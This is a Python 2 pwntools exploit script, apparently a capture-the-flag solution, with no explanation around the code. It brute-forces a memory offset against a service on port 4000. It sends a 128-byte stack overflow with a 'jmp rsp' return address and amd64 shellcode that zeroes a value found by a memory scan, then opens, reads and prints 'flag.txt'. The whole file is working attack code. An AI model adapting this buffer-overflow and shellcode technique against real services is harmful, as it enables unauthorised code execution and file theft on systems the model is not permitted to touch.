from pwn import *
from struct import pack
from socket import *
import time

context(arch = 'amd64', os = 'linux')

for i in range(0, 10000000, 500):
        t = 12500000 + i
        #sub rbx, 12513000 # Answer offset of the target server
        #sub rbx, 12622540 # Offset of my server
        f = open('input', 'wb')
        shellcode = enhex(asm('''
        mov rbx, 0x304aa3008
        mov rbx, [rbx]
        sub rbx, '''+str(t)+'''

        mov rcx, 0xffffffff
        next_again:
        mov rax, [rbx]
        cmp rax, rcx
        jz go_syscall
        add rbx, 4
        jmp next_again

        go_syscall:
        movq [rbx], 0

        movq [rsp], 0x67616c66
        movq [rsp+4], 0x7478742e
        push 0
        pop rcx
        mov [rsp+8], ecx

        lea rdi, [rsp]
        xor rsi, rsi
        xor rax, rax
        inc rax
        inc rax
        syscall

        mov rbx,rax

        lea rsi, [rsp]
        mov rdi, rbx
        push 0x7f
        pop rdx
        xor rax, rax
        syscall

        lea rsi, [rsp]
        xor rdi, rdi
        inc rdi
        mov rdx, rax
        xor rax, rax
        inc rax
        syscall

        push 60
        pop rax
        syscall
        '''))
        
        shellcode = shellcode.decode('hex')

        # 0x48a76b is an address of 'jmp rsp'
        f.write("A"*128+pack('<Q',0x48a76b)+shellcode)
        f.close()

        s = socket(AF_INET, SOCK_STREAM)
        
        s.connect(('0.0.0.0',4000))
        s.send(open('input','rb').read())
        time.sleep(0.1)
        data = s.recv(10240)
        print data
        if "invalid" in data:
                print data
        elif len(data) > 0:
                print str(t)
                break
        s.close()
